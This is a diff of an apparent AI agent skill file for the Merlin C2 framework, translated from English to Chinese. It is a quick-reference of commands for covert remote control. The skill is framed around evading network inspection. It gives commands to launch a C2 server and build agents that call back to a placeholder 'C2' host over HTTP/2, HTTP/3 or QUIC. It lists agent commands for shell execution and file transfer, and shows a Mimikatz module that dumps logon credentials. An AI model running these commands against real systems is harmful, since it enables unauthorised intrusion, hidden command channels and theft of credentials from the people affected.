@@ -1,57 +1,55 @@
 ---
 name: merlin
 description: >
-  This skill should be used when the user asks about "merlin", "needing a
-  Go-based implant over non-standard encrypted channels to evade network
-  inspection". Cross-platform C2 server using HTTP/2 (h2c), HTTP/3 (QUIC), and
-  DNS transports for covert agent communication.
+  此技能适用于用户询问关于 "merlin"、"需要基于 Go 的植入物通过非标准加密信道规避网络检测"、
+  "使用 HTTP/2、HTTP/3 或 DNS 传输的跨平台 C2 框架" 的问题。
 ---
 
 # Merlin
 
-Cross-platform C2 using HTTP/2 and HTTP/3 (QUIC) — Go server + multi-OS agent.
+跨平台 C2 (命令与控制) 框架，使用 HTTP/2 和 HTTP/3 (QUIC) — Go 服务端 + 多操作系统 Agent。
 
-## Quick Start
+## 快速开始
 
 ```bash
-# Download from https://github.com/Ne0nd0g/merlin/releases
+# 从 https://github.com/Ne0nd0g/merlin/releases 下载
 
-# Start server (HTTPS/HTTP2 on 443)
+# 启动服务端（HTTPS/HTTP2，监听 443）
 ./merlinServer-Linux-x64 -i 0.0.0.0 -p 443 -x509cert server.crt -x509key server.key
 
-# Generate agent
+# 生成 Agent
 ./merlinAgent-Linux-x64 -url https://C2:443/ -psk "passphrase"
 ```
 
-## Server Commands
+## 服务端命令
 
-| Command | Purpose |
+| 命令 | 用途 |
 |---------|---------|
-| `sessions` | List connected agents |
-| `interact <UUID>` | Enter agent session |
-| `use module <path>` | Load a module |
-| `upload <src> <dst>` | Upload file to agent |
-| `download <src>` | Download from agent |
-| `shell <cmd>` | Run OS command |
-| `exit` | Terminate agent |
+| `sessions` | 列出已连接的 Agent |
+| `interact <UUID>` | 进入 Agent 会话 |
+| `use module <path>` | 加载模块 |
+| `upload <src> <dst>` | 上传文件到 Agent |
+| `download <src>` | 从 Agent 下载文件 |
+| `shell <cmd>` | 执行系统命令 |
+| `exit` | 终止 Agent |
 
-## Common Workflows
+## 常见工作流
 
-**HTTP/3 QUIC listener:**
+**HTTP/3 QUIC 监听器：**
 ```bash
 ./merlinServer-Linux-x64 -proto h3 -i 0.0.0.0 -p 8443
 ./merlinAgent-Windows-x64.exe -url https://C2:8443/ -proto h3 -psk "passphrase"
 ```
 
-**Mimikatz via Merlin module:**
+**通过 Merlin 模块使用 Mimikatz：**
 ```
 interact <UUID>
 use module windows/credentials/mimikatz/logonpasswords
 run
 ```
 
-## Resources
+## 参考资源
 
-| File | When to load |
+| 文件 | 加载时机 |
 |------|--------------|
-| `references/` | Transport options and agent build flags |
+| `references/` | 传输选项和 Agent 编译参数 |
